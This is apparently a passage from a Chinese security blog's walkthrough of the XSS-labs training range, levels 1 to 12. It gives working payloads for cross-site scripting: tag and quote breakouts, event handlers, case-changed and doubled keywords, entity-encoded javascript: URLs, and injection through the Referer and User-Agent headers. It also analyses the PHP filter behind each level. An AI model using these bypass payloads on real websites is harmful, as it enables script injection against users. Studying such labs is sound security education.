+<h3 id="用-代替http-（服务器是Linux系统可以绕过-Windows则不行）"><a href="#用-代替http-（服务器是Linux系统可以绕过-Windows则不行）" class="headerlink" title="用\\代替http://（服务器是Linux系统可以绕过,Windows则不行）"></a>用<code>\\</code>代替<code>http://</code>（服务器是Linux系统可以绕过,Windows则不行）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">要注意在windows中\本身就有特殊用途，是一个path的写法，所以\\在Windows下是file协议，在linux中才会是当前域的协议<br></code></pre></td></tr></table></figure>
+
+<p>在Windows中：</p>
+<p>输入<code>\\www.baidu.com</code>，它就已经提示我会变成<code>file://www.baidu.com</code></p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/005-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>访问便提示我没有这个文件</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/006-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>而输入<code>\\D:/phpStudy/PHPTutorial/WWW/phpinfo.php</code>，就访问了我D盘中的这个phpinfo.php文件</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/007-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>在Linux中：</p>
+<p>输入<code>\\www.baidu.com</code></p>
+<p>可以跳转到<code>https://www.baidu.com</code>，即百度</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/009-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h3 id="用。中文句号代替-英文句号"><a href="#用。中文句号代替-英文句号" class="headerlink" title="用。中文句号代替.英文句号"></a>用<code>。</code>中文句号代替<code>.</code>英文句号</h3><p>如果你在你在域名中输入<code>。</code>中文的句号，浏览器会自动转化成<code>.</code>英文的句号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;  //会自动跳转到百度<br></code></pre></td></tr></table></figure>
+<h1 id="XSS-labs靶场实例"><a href="#XSS-labs靶场实例" class="headerlink" title="XSS-labs靶场实例"></a>XSS-labs靶场实例</h1><h2 id="level-1：直接构造"><a href="#level-1：直接构造" class="headerlink" title="level 1：直接构造"></a>level 1：直接构造</h2><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>第一关很简单。是get请求，提交name参数值为xi，完整的显示在返回的页面源代码中：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/010-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>那么我们把值xi改成<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，即可成功弹框，那么我们也就成功了：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/011-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="后台源代码分析"><a href="#后台源代码分析" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p>通过<code>$_GET[&quot;name&quot;]</code>，获取<code>name</code>的值，没有过滤通过<code>echo</code>直接进行了输出</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/012-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="level-2：双引号尖括号闭合"><a href="#level-2：双引号尖括号闭合" class="headerlink" title="level 2：双引号尖括号闭合"></a>level 2：双引号尖括号闭合</h2><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p>这里我们在搜索框输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，可以发现其回显在了页面上，但是却没有弹框。这里可以看到标红的第1个点处我们的payload变成黑色了，那么第1个点肯定没希望了。</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/013-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>这里再多放一个右键点击查看源代码的图，从这里我们才能看出来端倪，其中第一个点的尖括号是被实体编码了。F12看元素看不出来第一个点的尖括号是被实体编码了：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/014-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>从这里我们可以看出右键点击查看源代码和F12检查元素查看页面源代码有些许不同：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">右键查看页面源代码或F12查看网络中的响应包：就是别人服务器发送到浏览器的原封不动的代码，也就是最原始的代码。<br><br>(F12)检查元素：看到的就是最终的html代码。即：源代码 + 网页js渲染 。<br><br>【注】在源代码中找不到的代码，是在浏览器执行js动态生成的。<br></code></pre></td></tr></table></figure>
+
+<p>那么这里回到上面标红的第2个点，第2个点会把我们输入的payload原封不动、不进行过滤的变成keyword的value。那么这里我们把前面的<code>&quot;</code>和input标签闭合：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，即可成功</p>
+<h2 id="后台源代码分析-1"><a href="#后台源代码分析-1" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/015-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><code>echo</code>的时候，采用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体；然而获取浏览器提交的keyword值，未进行如此转换，输出在<code>&lt;input name=keyword value=&quot;&#39;.$str.&#39;&quot;&gt;</code>。</p>
+<p>如果是keyword提交的是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,返回的就会是<code>&lt;input name=keyword value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</code>,javascript引擎并不会执行<code>&lt;script&gt;</code>,所以需要构造闭合。</p>
+<p>keyword提交<code>test&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code>,php处理后返回的html就会是<code>&lt;input name=keyword value=&quot;test&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;//&quot;&gt;</code>，&#x2F;&#x2F;是注释的作用，javascript引擎执行<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，最后成功</p>
+<h2 id="level-3：事件绕过和单引号闭合"><a href="#level-3：事件绕过和单引号闭合" class="headerlink" title="level 3：事件绕过和单引号闭合"></a>level 3：事件绕过和单引号闭合</h2><h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p>输入payload<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;</code>，不能成功，F12看元素还是这两个点，第2个点还是可以插入我们输入的值，但是却不能成功</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/016-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>那么依旧右键查看原始的页面源代码，才可以看出来这里两个点的尖括号都被实体编码了，而且value是<code>&#39;</code>单引号闭合；而F12中是<code>&quot;</code>双引号闭合的：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/017-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>那么这里构造事件来触发xss：<code>&#39; onclick=&#39;alert(1)</code>，这里我们通过右键查看原始的页面源代码也才能看出来是<code>&#39;</code>单引号才能闭合成功：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/018-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>最后再点击一下框就成功了：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/019-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="后台源代码分析-2"><a href="#后台源代码分析-2" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/020-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>采用<code>htmlspecialchars</code>函数对获取keyword参数中预定义的字符转换为 HTML 实体，输出在input标签的value中。<code>htmlspecichars</code>对尖括号进行了实体编码。</p>
+<h2 id="level-4：事件绕过和双引号闭合"><a href="#level-4：事件绕过和双引号闭合" class="headerlink" title="level 4：事件绕过和双引号闭合"></a>level 4：事件绕过和双引号闭合</h2><h2 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 3类似，只不过右键查看原始的页面源代码是双引号闭合，所以构造payload:<code>&quot; onclick=&quot;alert(1)</code>，最后再点击一下框就成功了。</p>
+<h2 id="后台源代码分析-3"><a href="#后台源代码分析-3" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/021-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>对get请求的keyword参数，用<code>str_replace()</code>函数过滤掉尖括号，返回给keyword的值；采用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体后用echo直接输出在返回的html中。</p>
+<h2 id="level-5：javascript伪协议绕过"><a href="#level-5：javascript伪协议绕过" class="headerlink" title="level 5：javascript伪协议绕过"></a>level 5：javascript伪协议绕过</h2><h2 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h2><p>先右键查看原始的页面源代码，发现是双引号闭合，输入尖括号发现第一个输出点被实体编码，而第二个输出点没被实体编码，构造payload<code>&quot;&gt;&lt;scirpt&gt;alert(1)&lt;/script&gt;&lt;</code>，这时用F12查看，发现变成这样：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/022-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>明显不行。这时再构造payload<code>&quot; onclick=&quot;alert(1)</code>，发现返回的html代码对on进行了过滤。</p>
+<p>那么这里利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript伪协议，payload：<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;</code>,没有对javascript伪协议进行过滤，对其进行点击，触发xss  
+ </p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/023-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="后台源代码分析-4"><a href="#后台源代码分析-4" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p>对get提交的keyword参数，<code>script</code>替换成<code>scr_ipt</code>,<code>on</code>替换成<code>o_n</code>，<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体后，输出在html中  
+ </p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/024-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="level-6：事件或javascript伪协议大小写绕过"><a href="#level-6：事件或javascript伪协议大小写绕过" class="headerlink" title="level 6：事件或javascript伪协议大小写绕过"></a>level 6：事件或javascript伪协议大小写绕过</h2><h2 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h2><p>先右键查看原始的页面源代码，发现是双引号闭合，经测试替换了<code>script</code>，<code>on</code>，没有过滤<code>&lt;&gt;</code>。构造a标签，利用href属性支持javascript伪协议构造payload，可是后台对href关键字进行替换。那么这里用大小写来绕过：<code>&quot;&gt;&lt;a Href=&#39;javascript:alert(1)&#39;&gt;</code>，然后手动点击</p>
+<p>还有可以on大小写绕过：<code>&quot; Onclick=&quot;alert(1)</code>，记得搜索完要手动点击下框才能成功</p>
+<h2 id="后台源代码分析-5"><a href="#后台源代码分析-5" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/025-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>对get提交的keyword参数，<code>str_replace</code>函数替换<code>&lt;script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>关键字，采用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体后输出在html中</p>
+<h2 id="level-7：javascript伪协议双写绕过"><a href="#level-7：javascript伪协议双写绕过" class="headerlink" title="level 7：javascript伪协议双写绕过"></a>level 7：javascript伪协议双写绕过</h2><h2 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h2><p>先右键查看原始的页面源代码，发现是双引号闭合，构造<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;</code>，根据返回的html，发现过滤了<code>href</code>和<code>script</code>。尝试大小写不能进行绕过。</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/026-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>那么这里尝试双写绕过：<code>&quot;&gt;&lt;a hhrefref=&#39;javasscriptcript:alert(1)&#39;&gt;</code>，然后点击，成功绕过触发xss</p>
+<h2 id="后台源代码分析-6"><a href="#后台源代码分析-6" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p>先将get方式提交的keyword参数通过<code>strtolower</code>函数转换为小写，<code>str_replace</code>函数将关键字<code>script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>关键字替换成空，然后输出在html中</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/027-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="level-8：javascript伪协议实体编码绕过"><a href="#level-8：javascript伪协议实体编码绕过" class="headerlink" title="level 8：javascript伪协议实体编码绕过"></a>level 8：javascript伪协议实体编码绕过</h2><h2 id="过程-7"><a href="#过程-7" class="headerlink" title="过程"></a>过程</h2><p>这里可以看到有个友情链接，那么本身就有a标签href属性了。像下面点击友情链接就能跳转到百度了。</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/028-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>想到可以调用外部js，但事实并没那么简单，因为完成目标需要在本页面弹窗，才会显示输出，并跳转到下一关。因为这里是先添加一个链接，再打开这个链接，会打开另一个界面，就不在本界面弹窗，所以外部调用不可行，那么只能用javascript伪协议。</p>
+<p>那么这里直接写javascript伪协议：<code>javascript:alert(1)</code>，右键查看原始的页面源代码和F12其实都能看出来变成了<code>javascr_ipt:alert(1)</code>，那么应该是javascript关键字被替换了。那么这里尝试大小写，双写，是都无法进行绕过的。</p>
+<p>那我们只有尝试编码绕过了，用实体编码可绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">十进制实体编码：javascrip&amp;#116;:alert(1)<br>十六进制实体编码：javascrip&amp;#x74;:alert(1)<br>都是将t字符进行实体编码，当然对其他字符进行编码也可以，目的在于绕过服务端的匹配。客户端解析时又会将其转码为t，从而弹窗<br></code></pre></td></tr></table></figure>
+
+<p>两种选一种输入，然后点击便能成功</p>
+<h2 id="后台源代码分析-7"><a href="#后台源代码分析-7" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/029-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>先将get方式提交的keyword参数通过<code>strtolower</code>函数转换为小写，用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体，<code>str_replace</code>函数替换关键字<code>script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>、<code>&quot;</code>，然后输出在a标签的href属性中。</p>
+<h2 id="level-9：javascript伪协议实体编码-注释符-绕过"><a href="#level-9：javascript伪协议实体编码-注释符-绕过" class="headerlink" title="level 9：javascript伪协议实体编码 + 注释符//绕过"></a>level 9：javascript伪协议实体编码 + 注释符<code>//</code>绕过</h2><h2 id="过程-8"><a href="#过程-8" class="headerlink" title="过程"></a>过程</h2><p>这里发现还是有友情链接，那么用level 8的payload，href里直接显示链接不合法，测试发现输入中必须包含<code>http://</code></p>
+<p>那么我们用注释符<code>//</code>绕过即可。构造payload,这边有两种方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">十进制实体编码：javascrip&amp;#116;:alert(1)//http://127.0.0.1		<br>十六进制实体编码：javascrip&amp;#x74;:alert(1)//http://127.0.0.1		<br></code></pre></td></tr></table></figure>
+
+<p>也可以直接这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">十进制实体编码：javascrip&amp;#116;:alert(&#x27;http://127.0.0.1&#x27;)<br>十六进制实体编码：javascrip&amp;#x74;:alert(&#x27;http://127.0.0.1&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>然后点击就成功了</p>
+<h2 id="后台源代码分析-8"><a href="#后台源代码分析-8" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/030-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>先将get方式提交的keyword参数通过<code>strtolower</code>函数转换为小写，get提交的keyword参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体，<code>str_replace</code>函数替换关键字<code>script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>、<code>&quot;</code>，判断该变量有无http:&#x2F;&#x2F;</p>
+<h2 id="level-10：隐藏表单用GET方式自己创建text文本框配合事件绕过"><a href="#level-10：隐藏表单用GET方式自己创建text文本框配合事件绕过" class="headerlink" title="level 10：隐藏表单用GET方式自己创建text文本框配合事件绕过"></a>level 10：隐藏表单用GET方式自己创建text文本框配合事件绕过</h2><h2 id="过程-9"><a href="#过程-9" class="headerlink" title="过程"></a>过程</h2><p>keywordget传的参数值输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，右键查看原始的页面源代码发现输出的地方进行了html实体编码，一时间不知道该如何解决。我感觉也只有这一个输出点了：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/031-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>然后再详细查看页面源代码，发现可能有隐藏的表单，尝试提交t_link、t_history、t_sort参数：<code>?keyword=&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_link=&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_history=&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_sort=&lt;script&gt;alert(1)&lt;/script&gt;</code>，最后发现只有t_sort参数接收了并返回在了html的value中：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/032-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>只不过其中的尖括号被过滤了。也发现了是用<code>&quot;</code>双引号闭合。那么构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">?t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;  //因为页面中没有触发事件框，所以type=&quot;text&quot;构造一个文本框<br></code></pre></td></tr></table></figure>
+
+<p>然后页面会出现一个框，点击它，成功</p>
+<h2 id="后台源代码分析-9"><a href="#后台源代码分析-9" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/033-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>获取了get请求的keyword参数、t_sort参数，t_sort参数的键值也是可定义的，t_sort参数过滤掉了尖括号，输出在value属性中。</p>
+<h2 id="level-11：隐藏表单用Referer字段自己创建text文本框配合事件绕过"><a href="#level-11：隐藏表单用Referer字段自己创建text文本框配合事件绕过" class="headerlink" title="level 11：隐藏表单用Referer字段自己创建text文本框配合事件绕过"></a>level 11：隐藏表单用Referer字段自己创建text文本框配合事件绕过</h2><h2 id="过程-10"><a href="#过程-10" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 10相似，也是隐藏表单，只不过这里是有两个参数可以接收并返回在了html的value中，分别是t_sort参数和t_ref参数，但是t_sort参数输入level 10的payload：<code>?t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;</code>时，右键查看原始的页面源代码发现<code>&quot;</code>双引号和尖括号都给实体编码了：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/034-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>这里应该是用了<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体，没什么希望了。那么来看看t_ref参数：</p>
+<p>t_ref参数接收了并返回在了html的value中，而且不是像t_sort参数那样以get方式来获取值，而是获取http头里的Referer字段。</p>
+<p>那么这里就要用到burpsuite来抓包了：</p>
+<p>payload：<code>Referer:&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;</code></p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/035-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>这里有个疑惑：经过测试，<code>Referer</code>字段加在最后一行即<code>Accept-Language</code>字段下面一行就不能成功，而其它地方都是可以成功的。如果知道的人可以指教一下~</p>
+<p>然后页面会生成一个框，点它，成功</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/036-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="后台源代码分析-10"><a href="#后台源代码分析-10" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/037-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>获取get请求的keyword、t_sort参数和<code>Referer</code>字段，get提交的t_sort参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体、过滤<code>Referer</code>字段的尖括号后输出在html代码中</p>
+<h2 id="level-12：隐藏表单用User-Agent字段自己创建text文本框配合事件绕过"><a href="#level-12：隐藏表单用User-Agent字段自己创建text文本框配合事件绕过" class="headerlink" title="level 12：隐藏表单用User-Agent字段自己创建text文本框配合事件绕过"></a>level 12：隐藏表单用User-Agent字段自己创建text文本框配合事件绕过</h2><h2 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 11相似，也是隐藏表单，这里也是有两个参数可以接收并返回在了html的value中，分别是t_sort参数和t_ua参数。关于t_sort参数的分析和level 11的一样，具体可看level 11。</p>
+<p>那么这里来看看t_ua参数：</p>
+<p>t_ua参数接收了并返回在了html的value中，而且不是像t_sort参数那样以get方式来获取值，而是获取http头里的<code>User-Agent</code>字段。</p>
+<p>那么这里就要用到burpsuite来抓包了：</p>
+<p>payload：<code>User-Agent:&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;</code></p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/038-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>然后页面会生成一个框，点它，成功</p>
+<h2 id="后台源代码分析-11"><a href="#后台源代码分析-11" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/039-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>获取get请求的keyword、t_sort变量和<code>User-Agent</code>字段，get提交的t_sort参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体、过滤<code>User-Agent</code>字段的尖括号后输出在html代码中</p>
